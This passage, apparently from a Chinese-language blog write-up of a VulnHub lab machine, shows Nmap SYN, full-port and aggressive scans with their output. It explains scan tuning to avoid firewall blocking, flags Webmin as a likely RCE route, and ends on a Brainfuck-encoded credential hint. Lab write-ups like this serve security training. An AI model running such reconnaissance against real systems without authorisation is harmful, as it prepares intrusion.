+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">28</span><span>Not shown: <span style="color:#a5d6ff">1000</span> filtered tcp ports <span style="color:#ff7b72;font-weight:bold">(</span>no-response<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">29</span><span>Too many fingerprints match this host to give specific OS details
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">30</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">31</span><span>TRACEROUTE <span style="color:#ff7b72;font-weight:bold">(</span>using port 80/tcp<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">32</span><span>HOP RTT    ADDRESS
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">33</span><span><span style="color:#a5d6ff">1</span>   ... <span style="color:#a5d6ff">30</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">34</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">35</span><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">36</span><span>Nmap <span style="color:#ff7b72">done</span>: <span style="color:#a5d6ff">1</span> IP address <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 34.11 seconds</span></span></code></pre></div><p>第一个命令结果是<code>1000 filtered tcp ports</code>，因为没加<code>sudo</code>，没扫出端口，Nmap默认切换了底层的扫描技术，这里用的是全连接扫描，它被迫使用操作系统的标准网络接口来执行TCP Connect Scan(<code>-sT</code>)，需要完成完整的TCP三次握手，而加上<code>sudo</code>，使用SYN Stealth Scan(-sS)，只发送第一个握手包(SYN)，不建立完整连接。
+而防火墙会对完整的连接请求敏感，一旦发现短时间内尝试连接大量端口，会判定为攻击并封锁我的ip</p>
+<p>新思路：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/vulnhub/vulnhub_em_br<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>└─$ sudo nmap -sS -Pn -p- --min-rate <span style="color:#a5d6ff">5000</span> 192.168.242.94 -oN all_ports.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span><span style="color:#ff7b72;font-weight:bold">[</span>sudo<span style="color:#ff7b72;font-weight:bold">]</span> password <span style="color:#ff7b72">for</span> kali: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span>Starting Nmap 7.95 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2026-01-22 01:08 EST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span>Nmap scan report <span style="color:#ff7b72">for</span> 192.168.242.94
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.012s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span>Not shown: <span style="color:#a5d6ff">65532</span> filtered tcp ports <span style="color:#ff7b72;font-weight:bold">(</span>no-response<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span>80/tcp  open  http
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span>139/tcp open  netbios-ssn
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span>445/tcp open  microsoft-ds
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span>Nmap <span style="color:#ff7b72">done</span>: <span style="color:#a5d6ff">1</span> IP address <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 180.97 seconds</span></span></code></pre></div><p>第二个命令明明加入了<code>-p-</code>，但是结束的非常快，原因在于这里使用了<code>--min-rate 5000</code>且去掉了复杂的探测参数，只发送SYN包，不管对方回不回，强制维持高频率发包速率，但是第二个命令也因此丢失了10000和20000端口！被错误归类为<code>filtered</code>中。</p>
+<h3 id="12-端口扫描最佳思路">1.2 端口扫描（最佳思路）<a class="anchor" href="#12-%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f%e6%9c%80%e4%bd%b3%e6%80%9d%e8%b7%af">#</a></h3>
+<p><del>先暴力发包</del>，<code>-sS -sV -sC -T4</code>搜索保证精确度兼顾速度，再针对发现的端口单独进行<code>-A</code>探测</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>└─$ sudo nmap -sS -sV -sC -T4 192.168.242.94 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span>Starting Nmap 7.95 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2026-01-22 00:47 EST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span>Nmap scan report <span style="color:#ff7b72">for</span> 192.168.242.94
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.0021s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span>Not shown: <span style="color:#a5d6ff">995</span> filtered tcp ports <span style="color:#ff7b72;font-weight:bold">(</span>no-response<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span>PORT      STATE SERVICE     VERSION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span>80/tcp    open  http        Apache httpd 2.4.51 <span style="color:#ff7b72;font-weight:bold">((</span>Debian<span style="color:#ff7b72;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span>|_http-title: Apache2 Debian Default Page: It works
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span>|_http-server-header: Apache/2.4.51 <span style="color:#ff7b72;font-weight:bold">(</span>Debian<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span>139/tcp   open  netbios-ssn Samba smbd <span style="color:#a5d6ff">4</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span>445/tcp   open  netbios-ssn Samba smbd <span style="color:#a5d6ff">4</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span>10000/tcp open  http        MiniServ 1.981 <span style="color:#ff7b72;font-weight:bold">(</span>Webmin httpd<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">14</span><span>|_http-title: <span style="color:#a5d6ff">200</span> &amp;mdash; Document follows
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">15</span><span>20000/tcp open  http        MiniServ 1.830 <span style="color:#ff7b72;font-weight:bold">(</span>Webmin httpd<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">16</span><span>|_http-title: <span style="color:#a5d6ff">200</span> &amp;mdash; Document follows
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">17</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">18</span><span>Host script results:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">19</span><span>|_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span style="color:#ff7b72;font-weight:bold">(</span>unknown<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">20</span><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">21</span><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">22</span><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">23</span><span>| smb2-time: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">24</span><span>|   date: 2025-06-11T15:21:33
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">25</span><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">26</span><span>|_clock-skew: -224d14h26m10s
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">27</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">28</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">29</span><span>Nmap <span style="color:#ff7b72">done</span>: <span style="color:#a5d6ff">1</span> IP address <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 215.60 seconds
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">30</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">31</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">32</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/vulnhub/vulnhub_em_br<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">33</span><span>└─$ sudo nmap -A -p 80,139,445,10000,20000 192.168.242.94
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">34</span><span>Starting Nmap 7.95 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2026-01-22 02:52 EST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">35</span><span>Nmap scan report <span style="color:#ff7b72">for</span> 192.168.242.94
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">36</span><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.00092s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">37</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">38</span><span>PORT      STATE SERVICE     VERSION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">39</span><span>80/tcp    open  http        Apache httpd 2.4.51 <span style="color:#ff7b72;font-weight:bold">((</span>Debian<span style="color:#ff7b72;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">40</span><span>|_http-server-header: Apache/2.4.51 <span style="color:#ff7b72;font-weight:bold">(</span>Debian<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">41</span><span>|_http-title: Apache2 Debian Default Page: It works
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">42</span><span>139/tcp   open  netbios-ssn Samba smbd <span style="color:#a5d6ff">4</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">43</span><span>445/tcp   open  netbios-ssn Samba smbd <span style="color:#a5d6ff">4</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">44</span><span>10000/tcp open  http        MiniServ 1.981 <span style="color:#ff7b72;font-weight:bold">(</span>Webmin httpd<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">45</span><span>|_http-title: <span style="color:#a5d6ff">200</span> &amp;mdash; Document follows
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">46</span><span>20000/tcp open  http        MiniServ 1.830 <span style="color:#ff7b72;font-weight:bold">(</span>Webmin httpd<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">47</span><span>|_http-title: <span style="color:#a5d6ff">200</span> &amp;mdash; Document follows
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">48</span><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#a5d6ff">1</span> open and <span style="color:#a5d6ff">1</span> closed port
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">49</span><span>Device type: general purpose
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">50</span><span>Running: Linux 2.4.X
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">51</span><span>OS CPE: cpe:/o:linux:linux_kernel:2.4.37
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">52</span><span>OS details: DD-WRT v24-sp2 <span style="color:#ff7b72;font-weight:bold">(</span>Linux 2.4.37<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">53</span><span>Network Distance: <span style="color:#a5d6ff">2</span> hops
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">54</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">55</span><span>Host script results:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">56</span><span>|_clock-skew: -224d14h26m09s
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">57</span><span>| smb2-time: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">58</span><span>|   date: 2025-06-11T17:26:57
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">59</span><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">60</span><span>|_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span style="color:#ff7b72;font-weight:bold">(</span>unknown<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">61</span><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">62</span><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">63</span><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">64</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">65</span><span>TRACEROUTE <span style="color:#ff7b72;font-weight:bold">(</span>using port 80/tcp<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">66</span><span>HOP RTT     ADDRESS
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">67</span><span><span style="color:#a5d6ff">1</span>   0.09 ms 192.168.203.2
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">68</span><span><span style="color:#a5d6ff">2</span>   0.07 ms 192.168.242.94
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">69</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">70</span><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">71</span><span>Nmap <span style="color:#ff7b72">done</span>: <span style="color:#a5d6ff">1</span> IP address <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 70.16 seconds</span></span></code></pre></div><p>根据扫描结果<del>如下</del>，Web服务(<code>80端口</code>)是Apache默认页，查看源代码或目录爆破可能有线索，SMB服务(<code>139、445端口</code>)发现Samba 4，可能有未授权共享，Webmin/Usermin(<code>10000/20000端口</code>)发现版本号1.981和1.830，Webmin历史上出过多次远程代码执行漏洞(RCE)，如果能找到账号密码，就能直接控制服务器。</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>80/tcp    open  http        Apache httpd 2.4.51 <span style="color:#ff7b72;font-weight:bold">((</span>Debian<span style="color:#ff7b72;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>|_http-server-header: Apache/2.4.51 <span style="color:#ff7b72;font-weight:bold">(</span>Debian<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>|_http-title: Apache2 Debian Default Page: It works
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>139/tcp   open  netbios-ssn Samba smbd <span style="color:#a5d6ff">4</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">5</span><span>445/tcp   open  netbios-ssn Samba smbd <span style="color:#a5d6ff">4</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">6</span><span>10000/tcp open  http        MiniServ 1.981 <span style="color:#ff7b72;font-weight:bold">(</span>Webmin httpd<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">7</span><span>|_http-title: <span style="color:#a5d6ff">200</span> &amp;mdash; Document follows
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">8</span><span>20000/tcp open  http        MiniServ 1.830 <span style="color:#ff7b72;font-weight:bold">(</span>Webmin httpd<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">9</span><span>|_http-title: <span style="color:#a5d6ff">200</span> &amp;mdash; Document follows</span></span></code></pre></div><h3 id="13-http探测">1.3 http探测<a class="anchor" href="#13-http%e6%8e%a2%e6%b5%8b">#</a></h3>
+<p>F12源码，发现神秘信息，这里是Brainfuck语言编程的</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>&lt;!--
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>don&#39;t worry no one will get here, it&#39;s safe to share with you my access. Its encrypted :)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.
